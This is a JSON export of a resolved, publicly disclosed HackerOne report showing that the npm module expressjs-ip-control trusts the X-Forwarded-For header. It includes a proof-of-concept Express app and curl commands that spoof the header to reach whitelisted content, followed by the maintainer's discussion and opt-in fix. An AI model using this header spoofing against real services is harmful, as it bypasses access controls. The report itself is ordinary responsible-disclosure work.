{
  "id": 693788,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82OTM3ODg=",
  "url": "https://hackerone.com/reports/693788",
  "title": "[expressjs-ip-control] Whitelist IP bypass leads to authorization bypass and sensitive info disclosure",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-09-12T15:55:04.541Z",
  "submitted_at": "2019-09-12T15:55:04.541Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mik317",
    "url": "/mik317",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/235/168/b1978368a15e57488f15b4f8aff454d3e3e98184_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-10-29T19:27:29.116Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2020-09-29T19:27:20.544Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report a `unauthenticated access/authorization bypass` issue in the `expressjs-ip-control` module.\nIt allows to `bypass` the `whitelist IP check` in order to bypass the `authorization check` and possibly `expose sensitive datas`.\n\n# Module\n**module name:** [MODULE NAME]\n**version:** [MODULE VERSION]\n**npm page:** `https://www.npmjs.com/package/[MODULE NAME]`\n\n## Module Description\n> Expressjs package to whitelist IP addresses also support for x-forwarded-for ip addresses.\n\n## Module Stats\n[`N/A`] downloads in the last day\n[`17`] downloads in the last week\n[`~250`] downloads in the last month\n\n## Vulnerability Description\nThe issue arises because the module checks if is present in the request a `X-Forwarded-For` header, and bases the authorization on that check ... as we know, that header can be simply manipulated, in order to `bypass` the protection, leading to `sensitive information disclosure`.\n\n## Steps To Reproduce:\n1. Install the module: `npm i expressjs-ip-control`\n2. Create a PoC file like this:\n\n```js\n// poc.js\nconst express = require('express')\nconst app = express()\nconst ipControl = require('expressjs-ip-control')\n \napp.get('/', ipControl({\n    whitelist: '127.0.0.1, 192.168.10.10',\n}), (req, res) => res.send('SECRET TOKEN ACCESSIBLE ONLY BY LOCAL PC'))\n\napp.listen(3000)\n```\n3. Run the PoC: `node poc.js`\n4. Now, test the `whitelist` protection with this commands: \n\n```bash\ncurl 'http://localhost:3000/' # Obtain *403* response --> *You do not have rights to visit this page*\ncurl 'http://localhost:3000/' -H 'X-Forwarded-For: 127.0.0.1' # Obtain *200* response --> secret token\n```\n{F581254}\n\n## Patch\n> Don't check for the `x-forwarded-for` header, has it can be changed leading to `IP whitelist` bypass\n\n## Supporting Material/References:\n- [OPERATING SYSTEM VERSION]: Kali Linux\n- [NODEJS VERSION]: 10.16.3\n- [NPM VERSION]: 6.0.9\n\n# Wrap up\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\nI'm not sure you'll consider this issue valid, as the `x-forwarded-for` header support, is a feature of the library. However, this \"feature\" leads to the issue I've described. If you won't consider this valid, pls be clement and also, can I know if you consider valid the same issue applied to a `blacklist` module? (in that case, it could allow attackers blacklisted to change IP without change PC and so continue DOS/spam the server :))\n\n## Impact\n\n`Whitelist IP bypass`, leading to`Authorization issue` on `expressjs-ip-control`, may lead to `sensitive information disclosure`",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 581254,
      "file_name": "Screenshot_from_2019-09-12_15-36-06.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xvjoQSEDV8hKM5gkkt4AHTrw?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2019-09-12_15-36-06.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2019-09-12_15-36-06.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072201Z&X-Amz-Expires=3037&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=029d6578e0f63e67de82d67ea46674cc70350369bb3c49d38197a10f3ffdfc38",
      "file_size": 95721,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-10-29T19:27:20.630Z",
  "allow_singular_disclosure_after": -91454080.59728548,
  "singular_disclosure_allowed": true,
  "vote_count": 1,
  "voters": [
    "gr4nd_m4st3r"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 5792429,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "PS:\n\n## Module ##\n**module name:** `expressjs-ip-control`\n**module version:** `1.0.6`\n**npm page:** `https://www.npmjs.com/package/█████████`\n\nBest, Mik",
      "automated_response": false,
      "created_at": "2019-09-12T15:58:06.849Z",
      "updated_at": "2020-06-28T14:05:38.021Z",
      "actor": {
        "username": "mik317",
        "cleared": false,
        "verified": false,
        "url": "/mik317",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/235/168/b1978368a15e57488f15b4f8aff454d3e3e98184_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5802750,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @mik317,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@bassguitar ",
      "automated_response": false,
      "created_at": "2019-09-13T20:15:12.537Z",
      "updated_at": "2019-09-13T20:15:12.537Z",
      "actor": {
        "username": "h1_analyst_layla",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_layla",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/xx9fc0e3lc64e3fe90710sz5i27h/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": true,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5802774,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNeedsMoreInfo",
      "message": "Hello @mik317 - When I perform step #3 (running `node poc.js`), I get the following error:\n\n```\ninternal/modules/cjs/loader.js:613\n    throw err;\n    ^\n\nError: Cannot find module 'express'\nRequire stack:\n[REDACTED]\n```\n\nDid you experience that before?\n\nRegards,\n@bassguitar ",
      "automated_response": false,
      "created_at": "2019-09-13T20:17:58.827Z",
      "updated_at": "2019-09-13T20:17:58.827Z",
      "actor": {
        "username": "h1_analyst_layla",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_layla",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/xx9fc0e3lc64e3fe90710sz5i27h/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": true,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5806434,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNew",
      "message": "Hi @bassguitar :)\nThat's a mistake in the `nodejs` library used lol. I thought the `dependencies` would have been downloaded anyway, but it's not like this. To resolve this type of error, you have always to run the following command: `npm i <module_not_found>`, so in this case, you must run `npm i express` :)\nSo, you'll be able to run the poc without problems :)\n\nBest, Mik",
      "automated_response": false,
      "created_at": "2019-09-14T11:19:00.536Z",
      "updated_at": "2019-09-14T11:19:00.536Z",
      "actor": {
        "username": "mik317",
        "cleared": false,
        "verified": false,
        "url": "/mik317",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/235/168/b1978368a15e57488f15b4f8aff454d3e3e98184_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5806796,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Hello @mik317,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@bassguitar ",
      "automated_response": false,
      "created_at": "2019-09-14T14:11:49.936Z",
      "updated_at": "2019-09-14T14:11:49.936Z",
      "actor": {
        "username": "h1_analyst_layla",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_layla",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/xx9fc0e3lc64e3fe90710sz5i27h/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": true,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8455883,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ExternalUserJoined",
      "message": "",
      "automated_response": false,
      "created_at": "2020-06-30T12:57:51.274Z",
      "updated_at": "2020-06-30T12:57:51.274Z",
      "actor": {
        "username": "bespokeweb",
        "cleared": false,
        "verified": false,
        "url": "/bespokeweb",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8456244,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @bassguitar thanks for your report. I created this package because i couldn't find any package that is able to check a X-Forwarded-For. For my project this was/is required, because i'm hosting a node application on my server with a proxy pass via Nginx. So all requests being done to my node application are coming from the IP of my own server (because of the proxy pass). Nginx puts the real request IP address in the X-Forwarded-For header. \n\nSo if I remove this option, I fully break all security for some of my projects. Blacklisting wouldn't do me any good because I need all requests to fail except those of some clients who have access (via IP). What I can do is make the header optional and add a warning to the documentation so users have to enable checking the X-Forwarded-For header. Would that solves this case?",
      "automated_response": false,
      "created_at": "2020-06-30T13:35:13.226Z",
      "updated_at": "2020-06-30T13:35:13.226Z",
      "actor": {
        "username": "bespokeweb",
        "cleared": false,
        "verified": false,
        "url": "/bespokeweb",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8951134,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @bespokeweb, thanks for the clarification.\n\nJust as a side-note, @bassguitar is a member of the HackerOne triage team.\nThe issue was reported by @mik317.\n\nWhat do you think should be done here @mik317?",
      "automated_response": false,
      "created_at": "2020-08-16T20:28:34.851Z",
      "updated_at": "2020-08-16T20:28:34.851Z",
      "actor": {
        "username": "danielruf",
        "cleared": false,
        "verified": false,
        "url": "/danielruf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8953393,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@mik317 I actually just tested setting the header on my live application and it did not break. The steps i followed:\n- host a node application on a ubuntu server\n- use nginx to proxy pass a domain to http://localhost:3000\n- added my package and whitelisted ipadres 192.168.10.10\n- performed curl request: \n curl {domain} -H 'X-Forwarded-For: 192.168.10.10'\n- and this still resulted in \nYou do not have rights to visit this page\n\nSo I think because of my nginx environment, it is not possible to set the X-Forwarded-For, because nginx will set it or overwrite it with the $remote_addr see here:\n\n location / {\n        proxy_pass http://localhost:3000;\n        proxy_http_version 1.1;\n        proxy_set_header   X-Forwarded-For $remote_addr;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection 'upgrade';\n        proxy_set_header Host $host;\n        proxy_cache_bypass $http_upgrade;\n    }\n\nSo is there a production case that this will not work?",
      "automated_response": false,
      "created_at": "2020-08-17T07:28:22.303Z",
      "updated_at": "2020-08-17T07:28:44.911Z",
      "actor": {
        "username": "bespokeweb",
        "cleared": false,
        "verified": false,
        "url": "/bespokeweb",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8953691,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @bespokeweb @danielruf  :),\nthanks for your help and hope you're doing well ;).\n\nI understand the scenario you described and I agree it's harder when using production cases.\nHowever, people who don't use `proxy pass domains` because they're hosting a `low performance` website, like a `personal server` to access the files on the work PC, are likely to begin vulnerable to this attack.\n\nI read your previous message and I understand it's quite difficult finding a way to fix this issue, but I think the last one proposed is the better one :) :\n\n>  What I can do is make the header optional and add a warning to the documentation so users have to enable checking the X-Forwarded-For header.\n\nThanks again,\nMik",
      "automated_response": false,
      "created_at": "2020-08-17T08:10:07.776Z",
      "updated_at": "2020-08-17T08:10:07.776Z",
      "actor": {
        "username": "mik317",
        "cleared": false,
        "verified": false,
        "url": "/mik317",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/235/168/b1978368a15e57488f15b4f8aff454d3e3e98184_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 9087663,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @bespokeweb,\n\nwhat do you think? The last proposed solution is in my opinion the best. So the header is optin and the docs mention the possible dangers of it so users should be aware of this.",
      "automated_response": false,
      "created_at": "2020-08-31T13:28:07.751Z",
      "updated_at": "2020-08-31T13:28:07.751Z",
      "actor": {
        "username": "danielruf",
        "cleared": false,
        "verified": false,
        "url": "/danielruf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 9361231,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Sorry for the wait, I already update the package with the last proposed solution!",
      "automated_response": false,
      "created_at": "2020-09-29T06:51:57.073Z",
      "updated_at": "2020-09-29T06:51:57.073Z",
      "actor": {
        "username": "bespokeweb",
        "cleared": false,
        "verified": false,
        "url": "/bespokeweb",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 9363577,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Awesome :),\nthanks @bespokeweb \n\n@danielruf can we close the report as `Resolved` then?\n\nCheers,\nMik",
      "automated_response": false,
      "created_at": "2020-09-29T10:43:43.542Z",
      "updated_at": "2020-09-29T10:43:43.542Z",
      "actor": {
        "username": "mik317",
        "cleared": false,
        "verified": false,
        "url": "/mik317",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/235/168/b1978368a15e57488f15b4f8aff454d3e3e98184_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 9368931,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "",
      "automated_response": false,
      "created_at": "2020-09-29T19:27:12.340Z",
      "updated_at": "2020-09-29T19:27:12.340Z",
      "actor": {
        "username": "danielruf",
        "cleared": false,
        "verified": false,
        "url": "/danielruf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "mik317",
        "url": "/mik317"
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 9368933,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-09-29T19:27:20.563Z",
      "updated_at": "2020-09-29T19:27:20.563Z",
      "first_to_agree": true,
      "actor": {
        "username": "danielruf",
        "cleared": false,
        "verified": false,
        "url": "/danielruf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 9674666,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-10-29T19:27:29.182Z",
      "updated_at": "2020-10-29T19:27:29.182Z",
      "actor": {
        "url": "/nodejs-ecosystem",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Node.js third-party modules"
        }
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}